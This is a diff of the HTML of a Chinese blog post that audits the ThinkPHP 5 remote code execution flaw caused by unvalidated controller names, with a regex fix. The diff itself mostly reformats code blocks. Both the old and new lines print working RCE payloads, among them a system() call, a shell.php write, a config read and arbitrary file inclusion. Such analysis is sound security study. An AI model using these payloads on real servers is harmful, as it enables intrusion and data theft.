@@ -18,12 +18,12 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x ?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd ?s&#x3D;index&#x2F;\think\view\driv">
+        <meta name="description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x ?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ThinkPHP5代码审计:代码执行(二)">
 <meta property="og:url" content="http://example.com/2024/06/12/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/index.html">
 <meta property="og:site_name" content="p0l1st&#39;s blog">
-<meta property="og:description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x ?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd ?s&#x3D;index&#x2F;\think\view\driv">
+<meta property="og:description" content="漏洞环境漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30 payload随版本调整: 5.1.x ?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815491.png">
 <meta property="og:image" content="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815109.png">
@@ -445,21 +445,23 @@
             <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</p>
 <p>payload随版本调整:</p>
 <p>5.1.x</p>
-<pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
-?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
-?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
-?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
-?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd
+?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;
+?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;
+?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id
+?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>5.0.x</p>
-<pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息
-?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
-?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
-?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息
+?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件
+?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件
+?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <p>这里我用的是5.1.25</p>
-<pre><code>?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815491.png" alt="image-20240612223655352"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本次漏洞存在于ThinkPHP底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致RCE。</p>
 <p>查阅官方的commit记录，发现其增加了对控制器名的检测</p>
@@ -468,8 +470,8 @@
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816109.png" alt="image-20240612214813065"></p>
 <p>这里没有开启强制路由，我们就可以使用路由兼容模式s参数，并且框架对控制器名没有检测，那么就可以调用任意的控制器。</p>
 <p>尝试利用**?s&#x3D;模块&#x2F;控制器&#x2F;方法**来测试一下，在前面分析SQL注入时我们知道所有用户参数都会经过Request类的input方法，而input方法又调用了filterValue方法，filterValue方法使用了call_user_func，那么就可以构造</p>
-<pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816422.png" alt="image-20240612220221561"></p>
 <p>可以看到命令执行成功了(注意版本)，那么再去查看官方修改的$controller，可以看到控制器名是从$result获取的，而result的值来自兼容模式下的pathinfo，即s参数</p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816906.png" alt="image-20240612221314556"></p>
@@ -481,7 +483,7 @@
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816339.png" alt="image-20240612223133249"></p>
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816863.png" alt="image-20240612223215613"></p>
 <p>最后注意5.0.x和5.1.x可利用的类不同</p>
-<pre><code>ThinkPHP 5.1.x                  ThinkPHP 5.0.x
+<pre class="line-numbers language-none"><code class="language-none">ThinkPHP 5.1.x                  ThinkPHP 5.0.x
 stdClass                        stdClass 
 Exception                       Exception 
 ErrorException                  ErrorException 
@@ -673,11 +675,15 @@ think\Session
 think\Debug 
 think\Cache 
 think\cache\Driver 
-think\cache\driver\File 
-</code></pre>
+think\cache\driver\File <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>使用正则表达式对控制器名进行合法性校验</p>
-<pre><code>^[A-Za-z](\w)*$
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">^[A-Za-z](\w)*$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img lazyload src="/images/loading.svg" data-src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p>
 
         </div>
